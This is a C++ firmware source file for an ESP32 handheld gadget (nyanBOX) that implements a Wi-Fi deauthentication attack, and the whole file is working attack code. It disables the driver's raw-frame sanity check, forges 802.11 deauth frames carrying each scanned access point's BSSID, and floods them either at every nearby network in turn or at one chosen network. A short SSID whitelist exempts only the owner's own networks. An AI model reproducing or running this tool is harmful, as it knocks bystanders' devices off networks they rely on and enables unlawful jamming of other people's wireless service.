/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/jbohack/nyanBOX
   ________________________________________
*/

#include "../include/deauth.h"
#include "../include/sleep_manager.h"
#include "../include/pindefs.h"

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

// Function to bypass frame validation (required for raw 802.11 frames)
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg;
    (void)arg2;
    (void)arg3;
    return 0;
}

#define MAX_APS 20

enum Mode { MODE_MENU, MODE_ALL, MODE_LIST, MODE_DEAUTH_SINGLE };
static Mode currentMode = MODE_MENU;
static int menuSelection = 0;
static int apIndex = 0;

const unsigned long SCAN_INTERVAL = 30000;
const unsigned long DEAUTH_INTERVAL = 5;
static unsigned long lastScanTime = 0;
static unsigned long lastDeauthTime = 0;

// Modify to whitelist network SSIDs
const char *ssidWhitelist[] = {
    "whitelistExample1", 
    "whitelistExample2"
};

const int whitelistCount = sizeof(ssidWhitelist) / sizeof(ssidWhitelist[0]);
inline bool isWhitelisted(const String &s) {
    for (int i = 0; i < whitelistCount; i++) {
      if (s == ssidWhitelist[i])
        return true;
    }
    return false;
}

struct AP_Info {
  String ssid;
  uint8_t bssid[6];
  int channel;
};

static AP_Info apList[MAX_APS];
static int apCount = 0;

static uint8_t deauthFrame[28] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                  0xFF, 0x00, 0x00, 0x01, 0x00};

void sendDeauth(const AP_Info &ap) {
  esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
  memcpy(deauthFrame + 10, ap.bssid, 6);
  memcpy(deauthFrame + 16, ap.bssid, 6);
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
  }
}

void performScan() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 30, "Scanning APs...");
  u8g2.sendBuffer();

  apCount = 0;
  int n = WiFi.scanNetworks(false, true);
  if (n > 0) {
    for (int i = 0; i < n && apCount < MAX_APS; i++) {
      String ssid = WiFi.SSID(i);
      if (!ssid.length() || isWhitelisted(ssid)) // Skip hidden/whitelisted networks
        continue;
      apList[apCount].ssid = ssid;
      memcpy(apList[apCount].bssid, WiFi.BSSID(i), 6);
      apList[apCount].channel = WiFi.channel(i);
      apCount++;
    }
  }
  WiFi.scanDelete();
}

void drawMenu() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 12, "Deauth Mode:");
  u8g2.drawStr(0, 28, menuSelection == 0 ? "> All networks" : "  All networks");
  u8g2.drawStr(0, 44, menuSelection == 1 ? "> Single AP" : "  Single AP");
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 62, "U/D=Move R=OK SEL=Exit");
  u8g2.sendBuffer();
}

void drawAll() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 12, "Deauthing all APs");
  char buf[24];
  snprintf(buf, sizeof(buf), "Found:%d Ch:%d", apCount,
           apList[apIndex].channel);
  u8g2.drawStr(0, 28, buf);
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 62, "L=Back SEL=Exit");
  u8g2.sendBuffer();
}

void drawList() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 12, "Select AP to deauth");
  if (apCount > 0) {
    char line1[32];
    snprintf(line1, sizeof(line1), "%s  Ch:%d", apList[apIndex].ssid.c_str(),
             apList[apIndex].channel);
    u8g2.drawStr(0, 28, line1);
    char line2[24];
    snprintf(line2, sizeof(line2), "%02X:%02X:%02X:%02X:%02X:%02X",
             apList[apIndex].bssid[0], apList[apIndex].bssid[1],
             apList[apIndex].bssid[2], apList[apIndex].bssid[3],
             apList[apIndex].bssid[4], apList[apIndex].bssid[5]);
    u8g2.drawStr(0, 44, line2);
  } else {
    u8g2.drawStr(0, 30, "No APs found");
  }
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 62, "U/D=Scroll R=Start L=Back SEL=Exit");
  u8g2.sendBuffer();
}

void drawDeauthSingle() {
  u8g2.clearBuffer();
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.drawStr(0, 12, "Deauthing Selected AP");
  char buf[32];
  snprintf(buf, sizeof(buf), "%s  Ch:%d", apList[apIndex].ssid.c_str(),
           apList[apIndex].channel);
  u8g2.drawStr(0, 28, buf);
  char mac[24];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           apList[apIndex].bssid[0], apList[apIndex].bssid[1],
           apList[apIndex].bssid[2], apList[apIndex].bssid[3],
           apList[apIndex].bssid[4], apList[apIndex].bssid[5]);
  u8g2.drawStr(0, 44, mac);
  u8g2.setFont(u8g2_font_5x8_tr);
  u8g2.drawStr(0, 62, "L=Stop & Back SEL=Exit");
  u8g2.sendBuffer();
}

void deauthSetup() {
  WiFi.mode(WIFI_AP);
  esp_wifi_set_promiscuous(true);
  pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
  pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
  pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
  pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);

  currentMode = MODE_MENU;
  menuSelection = 0;
  apIndex = 0;
  apCount = 0;
  lastScanTime = 0;
  lastDeauthTime = 0;

  performScan();
  lastScanTime = millis();
}

void deauthLoop() {
  unsigned long now = millis();

  if (now - lastScanTime >= SCAN_INTERVAL &&
      currentMode != MODE_DEAUTH_SINGLE) {
    performScan();
    lastScanTime = now;
    if (currentMode == MODE_ALL || currentMode == MODE_LIST)
      apIndex = 0;
  }

  bool up = digitalRead(BUTTON_PIN_UP) == LOW;
  bool down = digitalRead(BUTTON_PIN_DOWN) == LOW;
  bool left = digitalRead(BUTTON_PIN_LEFT) == LOW;
  bool right = digitalRead(BUTTON_PIN_RIGHT) == LOW;
  
  if (up || down || left || right) {
    updateLastActivity();
  }

  switch (currentMode) {
  case MODE_MENU:
    drawMenu();
    if (up || down) {
      menuSelection ^= 1;
      delay(200);
    }
    if (right) {
      currentMode = (menuSelection == 0 ? MODE_ALL : MODE_LIST);
      delay(200);
    }
    break;

  case MODE_ALL:
    drawAll();
    if (left) {
      currentMode = MODE_MENU;
      delay(200);
    }
    break;

  case MODE_LIST:
    drawList();
    if (up && apCount) {
      apIndex = (apIndex - 1 + apCount) % apCount;
      delay(200);
    }
    if (down && apCount) {
      apIndex = (apIndex + 1) % apCount;
      delay(200);
    }
    if (right && apCount) {
      currentMode = MODE_DEAUTH_SINGLE;
      delay(200);
    }
    if (left) {
      currentMode = MODE_MENU;
      delay(200);
    }
    break;

  case MODE_DEAUTH_SINGLE:
    drawDeauthSingle();
    if (left) {
      currentMode = MODE_LIST;
      delay(200);
    }
    break;
  }

  if (now - lastDeauthTime >= DEAUTH_INTERVAL && apCount) {
    lastDeauthTime = now;
    if (currentMode == MODE_ALL) {
      sendDeauth(apList[apIndex]);
      apIndex = (apIndex + 1) % apCount;
    } else if (currentMode == MODE_DEAUTH_SINGLE) {
      sendDeauth(apList[apIndex]);
    }
  }
}